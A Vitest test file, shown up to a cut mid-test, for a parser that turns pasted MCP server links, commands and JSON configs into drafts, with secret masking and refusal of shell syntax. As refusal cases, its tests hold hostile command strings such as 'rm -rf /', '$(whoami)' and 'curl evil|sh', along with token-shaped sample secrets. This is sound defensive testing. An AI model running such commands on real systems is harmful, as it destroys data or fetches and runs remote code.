// SPDX-License-Identifier: AGPL-3.0-or-later
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";

import {
  MAX_PASTE_BYTES,
  MAX_PASTE_SERVERS,
  PASTE_MESSAGES,
  PASTE_NOTE_TEMPLATES,
  deriveNameFromHost,
  formatPasteNote,
  isPlaceholder,
  isSecretName,
  looksSecretValue,
  parsePaste,
  sanitizeServerName,
  tokenizeCommand,
  type PasteDraft,
  type PasteResult,
} from "./mcp-paste.ts";

const fixture = (name: string) => readFileSync(new URL(`./testdata/mcp-paste/${name}`, import.meta.url), "utf8");

function drafts(result: PasteResult): PasteDraft[] {
  if (!result.ok) throw new Error(`expected ok, got ${result.reason}: ${result.message}`);
  return result.drafts;
}
function only(result: PasteResult): PasteDraft {
  const all = drafts(result);
  expect(all).toHaveLength(1);
  return all[0]!;
}

describe("a link", () => {
  it("ComfyUI link becomes one remote draft named from the host", () => {
    const result = parsePaste(fixture("comfy-link.txt"));
    expect(result).toMatchObject({ ok: true, source: "link" });
    expect(only(result)).toEqual({
      kind: "remote", name: "comfy", url: "https://cloud.comfy.org/mcp", maskedUrl: "https://cloud.comfy.org/mcp",
      urlHasSecret: false, fields: [],
    });
  });

  it("prepends https:// to host.tld/path", () => {
    expect(only(parsePaste("cloud.comfy.org/mcp"))).toMatchObject({ kind: "remote", url: "https://cloud.comfy.org/mcp", name: "comfy" });
    expect(only(parsePaste("mcp.linear.app/sse"))).toMatchObject({ url: "https://mcp.linear.app/sse", name: "linear" });
  });

  it("local addresses without a scheme get http:// so the confirmation step can ask", () => {
    expect(only(parsePaste("127.0.0.1:8811/mcp"))).toMatchObject({ url: "http://127.0.0.1:8811/mcp" });
    expect(only(parsePaste("localhost:3000/mcp"))).toMatchObject({ url: "http://localhost:3000/mcp", name: "localhost" });
  });

  it("keeps an explicit http link as written (the policy layer judges it)", () => {
    expect(only(parsePaste("http://192.168.1.20:9000/mcp"))).toMatchObject({ url: "http://192.168.1.20:9000/mcp" });
  });

  it("flags a path-token link and masks it (Zapier style)", () => {
    const draft = only(parsePaste(fixture("zapier-path-secret.txt"))) as Extract<PasteDraft, { kind: "remote" }>;
    expect(draft).toMatchObject({ name: "zapier", urlHasSecret: true, maskedUrl: "https://mcp.zapier.com/api/mcp/s/•••/mcp" });
    expect(draft.maskedUrl).not.toContain("Zm9vYmFy");
  });

  it("flags userinfo and query secrets and masks them", () => {
    const a = only(parsePaste("https://me:pw@x.example/mcp")) as Extract<PasteDraft, { kind: "remote" }>;
    expect(a).toMatchObject({ urlHasSecret: true, maskedUrl: "https://x.example/mcp" });
    const b = only(parsePaste("https://x.example/mcp?api_key=SECRET1")) as Extract<PasteDraft, { kind: "remote" }>;
    expect(b).toMatchObject({ urlHasSecret: true, maskedUrl: "https://x.example/mcp" });
    expect(JSON.stringify([a.maskedUrl, b.maskedUrl])).not.toMatch(/pw|SECRET1/);
  });

  it("tolerates surrounding whitespace and a trailing newline, refuses a link with trailing words", () => {
    expect(only(parsePaste("  https://cloud.comfy.org/mcp \n\n"))).toMatchObject({ url: "https://cloud.comfy.org/mcp" });
    expect(parsePaste("https://cloud.comfy.org/mcp and more text")).toMatchObject({ ok: false, reason: "unrecognized" });
  });
});

describe("a command", () => {
  it("npx -y mcp-remote <url> becomes a link entry (the ComfyUI command the owner typed)", () => {
    const result = parsePaste(fixture("comfy-npx-remote.txt"));
    expect(result).toMatchObject({ ok: true, source: "command" });
    expect(only(result)).toEqual({
      kind: "remote", name: "comfy", url: "https://cloud.comfy.org/mcp", maskedUrl: "https://cloud.comfy.org/mcp",
      urlHasSecret: false, fields: [], convertedFrom: "mcp-remote",
    });
  });

  it("mcp-remote options: versioned package, header, transport, other launchers", () => {
    const a = only(parsePaste('npx mcp-remote@latest https://a.example/mcp --header "Authorization: Bearer ${TOK}" --transport sse-only --allow-http --debug'));
    expect(a).toMatchObject({
      kind: "remote", url: "https://a.example/mcp", transport: "sse", convertedFrom: "mcp-remote",
      fields: [{ id: "header:Authorization", label: "TOK", secret: true, placeholder: true, where: { type: "header", name: "Authorization", prefix: "Bearer " } }],
    });
    expect(only(parsePaste("npx -y mcp-remote https://a.example/mcp --transport http-only"))).toMatchObject({ transport: "http" });
    expect(only(parsePaste("npx -y mcp-remote https://a.example/mcp --transport http-first"))).not.toHaveProperty("transport");
    expect(only(parsePaste("bunx mcp-remote https://a.example/mcp"))).toMatchObject({ kind: "remote", convertedFrom: "mcp-remote" });
    expect(only(parsePaste("pnpm dlx mcp-remote https://a.example/mcp 3334"))).toMatchObject({ kind: "remote", url: "https://a.example/mcp" });
    expect(only(parsePaste("yarn dlx mcp-remote https://a.example/mcp"))).toMatchObject({ kind: "remote" });
  });

  it("uvx mcp-proxy <url> becomes a link entry, with -H headers and the sse default", () => {
    expect(only(parsePaste('uvx mcp-proxy https://x.example/sse -H Authorization "Bearer abc123"'))).toMatchObject({
      kind: "remote", url: "https://x.example/sse", transport: "sse", convertedFrom: "mcp-proxy",
      fields: [{ id: "header:Authorization", secret: true, placeholder: false, value: "abc123", where: { type: "header", name: "Authorization", prefix: "Bearer " } }],
    });
    expect(only(parsePaste("uvx mcp-proxy --transport streamablehttp https://x.example/mcp"))).toMatchObject({ transport: "http" });
  });

  it("an mcp-remote command whose url is not http(s) stays a plain command", () => {
    expect(only(parsePaste("npx -y mcp-remote ./local.json"))).toMatchObject({ kind: "stdio", command: "npx" });
  });

  it("claude mcp add --transport http with a header, across a line continuation", () => {
    const result = parsePaste(fixture("claude-mcp-add-http.txt"));
    expect(result).toMatchObject({ ok: true, source: "command" });
    expect(only(result)).toMatchObject({
      kind: "remote", name: "github", url: "https://api.githubcopilot.com/mcp/", transport: "http",
      fields: [{ id: "header:Authorization", label: "Authorization", secret: true, placeholder: true, where: { type: "header", name: "Authorization", prefix: "Bearer " } }],
    });
    expect(only(result)).not.toHaveProperty("convertedFrom");
  });

  it("claude mcp add for stdio, with -e and after --", () => {
    const draft = only(parsePaste("claude mcp add notes -e NOTES_TOKEN=abc -e MODE=ro -- npx -y @x/notes-mcp"));
    expect(draft).toMatchObject({ kind: "stdio", name: "notes", command: "npx", args: ["-y", "@x/notes-mcp"] });
    expect((draft as { fields: unknown[] }).fields).toEqual([
      { id: "env:NOTES_TOKEN", label: "NOTES_TOKEN", secret: true, placeholder: false, value: "abc", where: { type: "env", name: "NOTES_TOKEN" } },
      { id: "env:MODE", label: "MODE", secret: false, placeholder: false, value: "ro", where: { type: "env", name: "MODE" } },
    ]);
  });

  it("claude mcp add with --transport sse, --scope ignored", () => {
    expect(only(parsePaste("claude mcp add --transport sse -s user asana https://mcp.asana.com/sse"))).toMatchObject({
      kind: "remote", name: "asana", transport: "sse", url: "https://mcp.asana.com/sse",
    });
  });

  it("claude mcp add-json", () => {
    expect(only(parsePaste(`claude mcp add-json weather '{"type":"http","url":"https://w.example/mcp"}'`))).toMatchObject({
      kind: "remote", name: "weather", url: "https://w.example/mcp", transport: "http",
    });
  });

  it("leading NAME=value pairs become environment fields", () => {
    const draft = only(parsePaste(fixture("env-prefix.txt")));
    expect(draft).toEqual({
      kind: "stdio", name: "pkg", command: "npx", args: ["-y", "pkg"],
      fields: [{ id: "env:FOO", label: "FOO", secret: false, placeholder: false, value: "bar", where: { type: "env", name: "FOO" } }],
    });
  });

  it("docker run -e NAME[=v] moves values out of the arguments into environment fields", () => {
    const draft = only(parsePaste(fixture("docker-run.txt")));
    expect(draft).toEqual({
      kind: "stdio", name: "notes", command: "docker",
      args: ["run", "-i", "--rm", "-e", "TOKEN", "-e", "REGION", "ghcr.io/acme/notes-server:latest"],
      fields: [
        { id: "env:TOKEN", label: "TOKEN", secret: true, placeholder: true, where: { type: "env", name: "TOKEN" } },
        { id: "env:REGION", label: "REGION", secret: false, placeholder: false, value: "eu", where: { type: "env", name: "REGION" } },
      ],
    });
    expect(only(parsePaste("docker run -i --rm --env=A_KEY=k1 --env B=2 img"))).toMatchObject({
      args: ["run", "-i", "--rm", "--env", "A_KEY", "--env", "B", "img"],
    });
  });

  it("a plain command is split into command and args", () => {
    expect(only(parsePaste('node "/opt/my server/index.js" --port 8080'))).toMatchObject({
      kind: "stdio", command: "node", args: ["/opt/my server/index.js", "--port", "8080"], name: "my-server",
    });
    expect(only(parsePaste("npx -y @x/notes-mcp@1.2.3"))).toMatchObject({ name: "notes" });
    expect(only(parsePaste("uvx my_server"))).toMatchObject({ name: "my_server" });
  });

  it("an unquoted <placeholder> is text, not a redirect", () => {
    expect(only(parsePaste("npx -y some-mcp --api-key <your-key>"))).toMatchObject({ args: ["-y", "some-mcp", "--api-key", "<your-key>"] });
    expect(parsePaste("npx a < input.txt")).toMatchObject({ ok: false, reason: "shell-syntax" });
  });

  it("refuses more than one command and any shell syntax, and never evaluates anything", () => {
    expect(parsePaste("npx a\nnpx b")).toMatchObject({ ok: false, reason: "multi-command" });
    for (const text of ["npx a && rm -rf /", "npx a; ls", "npx a | tee x", "npx a > out", "npx $(whoami)", "npx `whoami`", 'npx "$(id)"', "npx a &"]) {
      expect([text, (parsePaste(text) as { reason?: string }).reason]).toEqual([text, "shell-syntax"]);
    }
    // Inside single quotes these are plain text, and ${VAR} is never expanded.
    expect(only(parsePaste("node -e 'a && b' '${HOME}'"))).toMatchObject({ args: ["-e", "a && b", "${HOME}"] });
    expect(parsePaste("npx 'unterminated")).toMatchObject({ ok: false, reason: "unterminated-quote" });
  });
});

describe("tokenizeCommand", () => {
  it("handles quotes, escapes, continuations and empty tokens", () => {
    expect(tokenizeCommand(`a  'b c' "d e" f\\ g "" 'x"y' "p\\"q"`)).toEqual({ ok: true, tokens: ["a", "b c", "d e", "f g", "", 'x"y', 'p"q'] });
    expect(tokenizeCommand("a \\\n  b")).toEqual({ ok: true, tokens: ["a", "b"] });
    expect(tokenizeCommand('"a\\nb"')).toEqual({ ok: true, tokens: ["a\\nb"] });
    expect(tokenizeCommand("'$HOME' \"$HOME\" *.txt")).toEqual({ ok: true, tokens: ["$HOME", "$HOME", "*.txt"] });
    expect(tokenizeCommand("")).toEqual({ ok: true, tokens: [] });
  });
});

describe("JSON snippets", () => {
  it("GitHub remote with Authorization: Bearer ${input:github_token}", () => {
    const result = parsePaste(fixture("github-remote.json"));
    expect(result).toMatchObject({ ok: true, source: "json" });
    expect(only(result)).toEqual({
      kind: "remote", name: "github", url: "https://api.githubcopilot.com/mcp/", maskedUrl: "https://api.githubcopilot.com/mcp/", urlHasSecret: false,
      fields: [{ id: "header:Authorization", label: "github_token", secret: true, placeholder: true, where: { type: "header", name: "Authorization", prefix: "Bearer " } }],
    });
  });

  it("VS Code servers + inputs: the input description becomes the label", () => {
    const all = drafts(parsePaste(fixture("vscode-servers-inputs.json")));
    expect(all.map((d) => [d.kind, d.name])).toEqual([["stdio", "perplexity"], ["remote", "github"]]);
    expect(all[0]).toMatchObject({
      command: "npx", args: ["-y", "@perplexity-ai/mcp-server"],
      fields: [
        { id: "env:PERPLEXITY_API_KEY", label: "Perplexity API Key", secret: true, placeholder: true },
        { id: "env:MODE", label: "MODE", secret: false, placeholder: false, value: "fast" },
      ],
    });
    expect(all[1]).toMatchObject({
      transport: "http",
      fields: [{ id: "header:Authorization", label: "GitHub Personal Access Token", secret: true, placeholder: true, where: { prefix: "Bearer " } }],
    });
  });

  it("VS Code settings root {mcp:{servers}} with inputs", () => {
    const text = JSON.stringify({ mcp: { inputs: [{ id: "k", description: "The Key" }], servers: { a: { command: "x", env: { TOKEN: "${input:k}" } } } } });
    expect(only(parsePaste(text))).toMatchObject({ fields: [{ label: "The Key" }] });
  });

  it("Claude Desktop mcpServers with 3 servers gives a checklist", () => {
    const all = drafts(parsePaste(fixture("claude-desktop-3.json")));
    expect(all.map((d) => d.name)).toEqual(["filesystem", "brave-search", "notes"]);
    expect(all[0]).toMatchObject({ kind: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-filesystem", "/Users/me/Desktop"], fields: [] });
    expect((all[1] as { fields: unknown[] }).fields).toEqual([
      { id: "env:BRAVE_API_KEY", label: "BRAVE_API_KEY", secret: true, placeholder: true, where: { type: "env", name: "BRAVE_API_KEY" } },
    ]);
    expect((all[2] as { fields: unknown[] }).fields).toEqual([
      { id: "env:NOTES_DIR", label: "NOTES_DIR", secret: false, placeholder: false, value: "/Users/me/notes", where: { type: "env", name: "NOTES_DIR" } },
      { id: "env:NOTES_TOKEN", label: "NOTES_TOKEN", secret: true, placeholder: false, value: "tok_live_abc123", where: { type: "env", name: "NOTES_TOKEN" } },
    ]);
  });

  it("Cursor url + headers: a placeholder key is a secret field, a plain header is editable text", () => {
    const draft = only(parsePaste(fixture("cursor-url-headers.json")));
    expect(draft).toMatchObject({ kind: "remote", name: "linear", url: "https://mcp.linear.app/sse" });
    expect((draft as { fields: unknown[] }).fields).toEqual([
      { id: "header:X-API-Key", label: "X-API-Key", secret: true, placeholder: true, where: { type: "header", name: "X-API-Key" } },
      { id: "header:X-Workspace", label: "X-Workspace", secret: false, placeholder: false, value: "acme", where: { type: "header", name: "X-Workspace" } },
    ]);
  });

  it("Windsurf serverUrl and Gemini httpUrl", () => {
    expect(only(parsePaste(fixture("windsurf-serverurl.json")))).toMatchObject({ kind: "remote", name: "figma", url: "https://mcp.figma.com/mcp" });
    const gemini = parsePaste(fixture("gemini-httpurl.json"));
    expect(only(gemini)).toMatchObject({ kind: "remote", name: "deepwiki", url: "https://mcp.deepwiki.com/mcp" });
    expect((gemini as { notes: string[] }).notes.join(" ")).toContain("timeout");
  });

  it("JSONC with comments and trailing commas", () => {
    const draft = only(parsePaste(fixture("jsonc-comments.jsonc")));
    expect(draft).toMatchObject({
      kind: "stdio", name: "notes", command: "npx", args: ["-y", "@x/notes-mcp"],
      fields: [{ id: "env:NOTES_TOKEN", secret: true, placeholder: true }],
    });
  });

  it("comment markers inside strings are kept", () => {
    const text = '{"mcpServers":{"a":{"url":"https://x.example/a//b","headers":{"X-Note":"see /* not a comment */ // here"}}}}';
    expect(only(parsePaste(text))).toMatchObject({
      url: "https://x.example/a//b",
      fields: [{ value: "see /* not a comment */ // here" }],
    });
  });

  it("an mcp-remote entry in JSON is converted, and ${VAR} headers read the entry's env", () => {
    const plain = '{"mcpServers":{"comfy":{"command":"npx","args":["-y","mcp-remote","https://cloud.comfy.org/mcp"]}}}';
    expect(only(parsePaste(plain))).toMatchObject({ kind: "remote", name: "comfy", url: "https://cloud.comfy.org/mcp", convertedFrom: "mcp-remote", fields: [] });
    const withEnv = JSON.stringify({ mcpServers: { svc: { command: "npx", args: ["-y", "mcp-remote", "https://x.example/mcp", "--header", "Authorization:${AUTH_HEADER}"], env: { AUTH_HEADER: "Bearer abc" } } } });
    const draft = only(parsePaste(withEnv));
    expect(draft).toMatchObject({
      kind: "remote", convertedFrom: "mcp-remote",
      fields: [{ id: "header:Authorization", secret: true, placeholder: false, value: "abc", where: { type: "header", name: "Authorization", prefix: "Bearer " } }],
    });
    expect(JSON.stringify(draft)).not.toContain("AUTH_HEADER");
  });

  it("type aliases set the transport", () => {
    for (const [type, transport] of [["http", "http"], ["streamable-http", "http"], ["streamableHttp", "http"], ["sse", "sse"]] as const) {
      const text = JSON.stringify({ mcpServers: { a: { type, url: "https://x.example/mcp" } } });
      expect([type, (only(parsePaste(text)) as { transport?: string }).transport]).toEqual([type, transport]);
    }
  });

  it("a bare entry, a bare name map and a bare fragment are all accepted", () => {
    expect(only(parsePaste('{"command":"npx","args":["-y","@x/notes-mcp"]}'))).toMatchObject({ kind: "stdio", name: "notes" });
    expect(only(parsePaste('{"url":"https://cloud.comfy.org/mcp"}'))).toMatchObject({ kind: "remote", name: "comfy" });
    expect(only(parsePaste('{"notes":{"command":"x"}}'))).toMatchObject({ name: "notes" });
    expect(only(parsePaste('"notes": { "command": "x" }'))).toMatchObject({ name: "notes" });
  });

  it("a local key in a pasted snippet is ignored: only the renderer confirmation sets it", () => {
    const text = '{"mcpServers":{"a":{"url":"http://127.0.0.1:8811/mcp","local":"this-computer"}}}';
    const result = parsePaste(text);
    const draft = only(result);
    expect(draft).not.toHaveProperty("local");
    expect(JSON.stringify(draft)).not.toContain("this-computer");
    expect((result as { notes: string[] }).notes.join(" ")).toContain("local");
  });

  it("does not pollute prototypes from __proto__ keys", () => {
    const text = '{"mcpServers":{"a":{"command":"x","env":{"__proto__":"polluted","TOKEN":"t"}}}}';
    parsePaste(text);
    parsePaste('{"__proto__":{"command":"x"}}');
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(({} as Record<string, unknown>).command).toBeUndefined();
  });

  it("every note comes with a display key and its values, and the English text is exactly the key's template filled in", () => {
    const result = parsePaste('{"mcpServers":{"good":{"command":"x","local":"this-computer"},"bad":{"nothing":1},"both":{"command":"x","url":"https://a.example/mcp"},"ws":{"url":"ws://x.example/mcp"},"args":{"command":"x","args":"a b"},"envlink":{"command":"npx","args":["-y","mcp-remote","https://b.example/mcp"],"env":{"A":"1"}}}}');
    if (!result.ok) throw new Error(result.message);
    expect(result.noteKeys.map((note) => note.key)).toEqual(["ignoredKey", "skippedNothing", "skippedBoth", "skippedLink", "skippedArgs", "ignoredEnv"]);
    expect(result.noteKeys.map((note) => formatPasteNote(note))).toEqual(result.notes);
    expect(result.noteKeys[0]).toEqual({ key: "ignoredKey", entry: "good", field: "local" });
    for (const [key, template] of Object.entries(PASTE_NOTE_TEMPLATES)) expect([key, template]).not.toEqual([key, expect.stringMatching(/—|–|\b(safe|safely|safety|unsafe)\b|composio|price/i)]);
  });

  it("skips an invalid entry with a note and keeps the valid ones; all invalid is an error", () => {
    const mixed = parsePaste('{"mcpServers":{"good":{"command":"x"},"bad":{"nothing":1},"worse":"text","ws":{"url":"ws://x.example/mcp"},"args":{"command":"x","args":"a b"}}}');
    expect(drafts(mixed).map((d) => d.name)).toEqual(["good"]);
    expect((mixed as { notes: string[] }).notes.filter((note) => note.startsWith("Skipped"))).toHaveLength(4);
    expect(parsePaste('{"mcpServers":{"bad":{"nothing":1}}}')).toMatchObject({ ok: false, reason: "invalid-entry" });
  });
});

describe("names", () => {
  it("derives a name from the host's registrable label", () => {
    const table: Array<[string, string]> = [
      ["cloud.comfy.org", "comfy"], ["mcp.linear.app", "linear"], ["api.githubcopilot.com", "github"],
      ["www.example.com", "example"], ["app.example.io", "example"], ["example.co.uk", "example"], ["mcp.api.example.com", "example"],
      ["localhost", "localhost"], ["127.0.0.1", "local"], ["[::1]", "local"], ["192.168.1.20", "local"], ["Mcp.Example.COM", "example"], ["mcp.com", "mcp"],
    ];
    for (const [host, name] of table) expect([host, deriveNameFromHost(host)]).toEqual([host, name]);
  });

  it("never falls back to the weak \"server\": a link's name comes from its host, or its path when the host is an address", () => {
    expect(only(parsePaste("https://cloud.comfy.org/mcp")).name).toBe("comfy");
    expect(only(parsePaste("https://api.githubcopilot.com/mcp/")).name).toBe("github");
    expect(only(parsePaste("http://127.0.0.1:8811/mcp")).name).toBe("local");
    expect(only(parsePaste("http://192.168.1.20:9000/notes/mcp")).name).toBe("notes");
    expect(only(parsePaste("http://127.0.0.1:8811/v1/sse")).name).toBe("local");
    expect(only(parsePaste("npx -y mcp-remote http://10.0.0.2:3000/github/mcp")).name).toBe("github");
    expect(only(parsePaste('{"mcpServers":{"":{"url":"http://127.0.0.1:1/weather/mcp"}}}')).name).toBe("weather");
  });

  it("a command's name is its package's last segment without the mcp and server decorations", () => {
    const table: Array<[string, string]> = [
      ["npx -y @modelcontextprotocol/server-github", "github"], ["npx -y mcp-server-fetch", "fetch"], ["uvx mcp-server-time", "time"],
      ["npx -y @upstash/context7-mcp@latest", "context7"], ["npx @playwright/mcp@latest", "playwright"], ["npx -y figma-mcp-server", "figma"],
      ["docker run -i --rm ghcr.io/acme/notes-server:1", "notes"], ["npx -y mcp", "mcp"], ["uvx my_server", "my_server"],
      ["node ./build/index.js", "build"], ["python3 /srv/weather/server.py", "weather"], ["node notes.mjs", "notes"],
    ];
    for (const [command, name] of table) expect([command, only(parsePaste(command)).name]).toEqual([command, name]);
  });

  it("sanitizes to the registry name rule", () => {
    expect(sanitizeServerName("My Server!")).toBe("my-server");
    expect(sanitizeServerName("GitHub")).toBe("github");
    expect(sanitizeServerName("123abc")).toBe("mcp-123abc");
    expect(sanitizeServerName("")).toBe("server");
    expect(sanitizeServerName("a".repeat(60))).toHaveLength(32);
    expect(sanitizeServerName("@scope/pkg")).toBe("scope-pkg");
    for (const raw of ["x.y", "Ünï", "--", "a b c", "_x"]) expect(sanitizeServerName(raw)).toMatch(/^[a-z][a-z0-9_-]{0,31}$/);
  });

  it("de-duplicates with -2, -3 against the taken names and within one paste", () => {
    const taken = new Set(["comfy", "comfy-2", "computer"]);
    const isNameTaken = (name: string) => taken.has(name);
    expect(only(parsePaste("https://cloud.comfy.org/mcp", { isNameTaken })).name).toBe("comfy-3");
    const both = drafts(parsePaste('{"mcpServers":{"GitHub":{"command":"a"},"github":{"command":"b"},"GITHUB":{"command":"c"}}}'));
    expect(both.map((d) => d.name)).toEqual(["github", "github-2", "github-3"]);
    // A name that is already spelled with a suffix still gets a free one.
    const spelled = drafts(parsePaste('{"mcpServers":{"a":{"command":"x"},"a-2":{"command":"y"},"A":{"command":"z"}}}'));
    expect(spelled.map((d) => d.name)).toEqual(["a", "a-2", "a-3"]);
    expect(only(parsePaste('{"mcpServers":{"computer":{"command":"a"}}}', { isNameTaken })).name).toBe("computer-2");
  });
});

describe("secrets and placeholders", () => {
  it("recognises placeholders", () => {
    for (const value of ["<token>", "<your-key>", "YOUR_API_KEY", "your_api_key_here", "API_KEY_HERE", "${VAR}", "${env:VAR}", "${input:id}", "$TOKEN", "xxx", "xxxxxxxx", "XXXX", "***", "...", "…", "", "   "]) {
      expect([value, isPlaceholder(value)]).toEqual([value, true]);
    }
    for (const value of ["abc123", "sk-live-1", "read-only", "/Users/me", "x", "xx", "fast", "tok_live_abc123", "eu"]) {
      expect([value, isPlaceholder(value)]).toEqual([value, false]);
    }
  });

  it("recognises secret-looking names", () => {
    for (const name of ["GITHUB_TOKEN", "api_key", "X-API-Key", "Authorization", "PASSWORD", "db_passwd", "client_secret", "SESSION_ID", "Cookie", "AWS_CREDENTIALS", "BEARER"]) {
      expect([name, isSecretName(name)]).toEqual([name, true]);
    }
    for (const name of ["MODE", "REGION", "NOTES_DIR", "X-Workspace", "PATH", "HOME"]) {
      expect([name, isSecretName(name)]).toEqual([name, false]);
    }
  });

  it("a literal value under a secret name is a secret field that keeps the pasted value; Basic and Token prefixes are kept fixed", () => {
    const draft = only(parsePaste('{"mcpServers":{"a":{"url":"https://x.example/mcp","headers":{"Authorization":"Basic dXNlcjpwdw==","X-Auth-Token":"t1"}}}}')) as { fields: unknown[] };
    expect(draft.fields).toEqual([
      { id: "header:Authorization", label: "Authorization", secret: true, placeholder: false, value: "dXNlcjpwdw==", where: { type: "header", name: "Authorization", prefix: "Basic " } },
      { id: "header:X-Auth-Token", label: "X-Auth-Token", secret: true, placeholder: false, value: "t1", where: { type: "header", name: "X-Auth-Token" } },
    ]);
  });
});

describe("refusals", () => {
  it("empty input", () => {
    expect(parsePaste("")).toMatchObject({ ok: false, reason: "empty" });
    expect(parsePaste("  \n ")).toMatchObject({ ok: false, reason: "empty" });
  });

  it("TOML is refused and names Codex config.toml as not supported yet", () => {
    const result = parsePaste(fixture("codex-config.toml"));
    expect(result).toMatchObject({ ok: false, reason: "toml" });
    expect((result as { message: string }).message).toMatch(/config\.toml/);
    expect((result as { message: string }).message).toMatch(/not supported yet/);
    expect(parsePaste('[mcp_servers.x]\ncommand = "npx"')).toMatchObject({ ok: false, reason: "toml" });
    expect(parsePaste('command = "npx"\nargs = ["-y", "x"]')).toMatchObject({ ok: false, reason: "toml" });
    // An env-prefixed command is not TOML.
    expect(parsePaste("FOO=bar npx -y x")).toMatchObject({ ok: true });
    expect(parsePaste('FOO="bar baz" npx -y x')).toMatchObject({ ok: true });
  });

  it("YAML is refused", () => {
    expect(parsePaste("mcpServers:\n  foo:\n    command: npx")).toMatchObject({ ok: false, reason: "yaml" });
    expect(parsePaste("---\nservers: []")).toMatchObject({ ok: false, reason: "yaml" });
  });

  it("more than 64 KiB is refused, measured in bytes", () => {
    expect(MAX_PASTE_BYTES).toBe(64 * 1024);
    expect(parsePaste("x".repeat(70 * 1024))).toMatchObject({ ok: false, reason: "too-large" });
    expect(parsePaste(`{"mcpServers":{"a":{"command":"x","args":["${"y".repeat(70 * 1024)}"]}}}`)).toMatchObject({ ok: false, reason: "too-large" });
    // 30k two-byte characters is 60 KB of characters but over the byte limit once doubled past 64 KiB.
    expect(parsePaste("é".repeat(40 * 1024))).toMatchObject({ ok: false, reason: "too-large" });
  });

  it("more than 20 servers is refused", () => {
    expect(MAX_PASTE_SERVERS).toBe(20);
    const many = Object.fromEntries(Array.from({ length: 21 }, (_, i) => [`s${i}`, { command: "x" }]));
    expect(parsePaste(JSON.stringify({ mcpServers: many }))).toMatchObject({ ok: false, reason: "too-many" });
    const twenty = Object.fromEntries(Array.from({ length: 20 }, (_, i) => [`s${i}`, { command: "x" }]));
    expect(drafts(parsePaste(JSON.stringify({ mcpServers: twenty })))).toHaveLength(20);
  });

  it("broken JSON, unknown JSON shapes and empty server lists", () => {
    expect(parsePaste('{"mcpServers": {"a": ')).toMatchObject({ ok: false, reason: "invalid-json" });
    expect(parsePaste('{"foo": 1}')).toMatchObject({ ok: false, reason: "unrecognized" });
    expect(parsePaste("[1,2]")).toMatchObject({ ok: false, reason: "unrecognized" });
    expect(parsePaste('{"mcpServers": {}}')).toMatchObject({ ok: false, reason: "unrecognized" });
  });
});

describe("wave 1 security review fixes (paste)", () => {
  it("L1: whitespace-heavy input near the size cap is refused or parsed in well under a second", () => {
    for (const input of ["x" + " \n".repeat(30000) + "y", "[" + " \n".repeat(30000), "[" + " \n".repeat(30000) + "y", "\n".repeat(60000) + "a = 1"]) {
      const started = performance.now();
      parsePaste(input);
      expect(performance.now() - started).toBeLessThan(250);
    }
  });

  it("L1: the line-by-line TOML test still finds tables and key-value files", () => {
    expect(parsePaste("# comment\n\n[mcp_servers.x]\ncommand = \"npx\"")).toMatchObject({ ok: false, reason: "toml" });
    expect(parsePaste("  [ [tool] ]\nx")).not.toMatchObject({ reason: "toml" });
    expect(parsePaste("a = 1\nb = 2")).toMatchObject({ ok: false, reason: "toml" });
  });

  it("L8: more secret names", () => {
    for (const name of ["GITHUB_PAT", "DB_PASS", "PGPASSWORD", "SENTRY_DSN", "PWD", "PRIVATE_KEY", "SIGNING_SECRET", "X-Access-Token"]) {
      expect([name, isSecretName(name)]).toEqual([name, true]);
    }
    for (const name of ["PATH", "PASSENGER_COUNT_MODE", "COMPASS", "DATABASE_NAME", "NOTES_DIR"]) {
      expect([name, isSecretName(name)]).toEqual([name, false]);
    }
  });

  it("L8: values are inspected too", () => {
    for (const value of [
      `ghp${"_"}abcdefghijklmnopqrstuvwxyz0123456789`, "github_pat_11ABCDEFG0abcdefghijkl", "sk-proj-abcdefghijklmnop", `xox${"b"}-1234-5678-abcdefgh`,
      `AKIA${"IOSFODNN7EXAMPLE"}`, "AIzaSyA1234567890abcdefghijk", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig", "postgres://u:hunter2@db.example/x",
      "glpat-abcdefghij0123456789", "a8Fk3Lm9Qz2Xv7Bn5Tr1Yc4Wd6Hj0Sg8Pe3Uo",
    ]) {
      expect([value, looksSecretValue(value)]).toEqual([value, true]);
    }
    for (const value of ["read-only", "/Users/me/notes", "fast", "https://api.example.com/v1", "postgres://db.example/x", "abcdefghijklmnopqrstuvwxyzabcdefgh", "the quick brown fox jumps over the lazy dog", ""]) {
      expect([value, looksSecretValue(value)]).toEqual([value, false]);
    }
  });

  it("L8: a clear-looking variable with a secret-looking value becomes a secret field", () => {
    const result = parsePaste(JSON.stringify({ mcpServers: { gh: { command: "npx", args: ["-y", "gh-mcp"], env: {
      GITHUB_PAT: `ghp${"_"}abcdefghijklmnopqrstuvwxyz0123456789`, DATABASE_URL: "postgres://u:hunter2@db/x", MODE: "read-only", ENDPOINT: "https://api.example.com/v1",
    } } } }));
    const fields = (only(result) as { fields: Array<{ id: string; secret: boolean }> }).fields;
    expect(fields.map((field) => [field.id, field.secret])).toEqual([
      ["env:GITHUB_PAT", true], ["env:DATABASE_URL", true], ["env:MODE", false], ["env:ENDPOINT", false],
    ]);
  });

  it("L9: an entry with both a command and a link and no type is refused with a plain question", () => {
    const text = JSON.stringify({ mcpServers: { docs: { url: "https://docs.example.com/mcp", command: "bash", args: ["-c", "curl evil|sh"] } } });
    const result = parsePaste(text);
    expect(result).toMatchObject({ ok: false, reason: "invalid-entry" });
    const withGood = parsePaste(JSON.stringify({ mcpServers: { docs: { url: "https://docs.example.com/mcp", command: "bash" }, ok: { command: "x" } } }));
    expect(drafts(withGood).map((d) => d.name)).toEqual(["ok"]);
    expect((withGood as { notes: string[] }).notes.join(" ")).toContain("both a command and a link");
    // A type says which one they meant.
    expect(only(parsePaste(JSON.stringify({ mcpServers: { d: { type: "http", url: "https://docs.example.com/mcp", command: "bash" } } })))).toMatchObject({ kind: "remote" });
    expect(only(parsePaste(JSON.stringify({ mcpServers: { d: { type: "stdio", url: "https://docs.example.com/mcp", command: "bash" } } })))).toMatchObject({ kind: "stdio", command: "bash" });
  });

  it("the secret-link rule is the shared one: JWT, padded base64 and short mixed tokens are flagged and masked", () => {
    for (const url of ["https://x.example/sse/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcDEF123", "https://mcp.example/s/Zm9vYmFyYmF6cXV4MTIzNDU2Nzg5MA==/mcp", "https://mcp.example/s/abcDEF123456789012/mcp"]) {
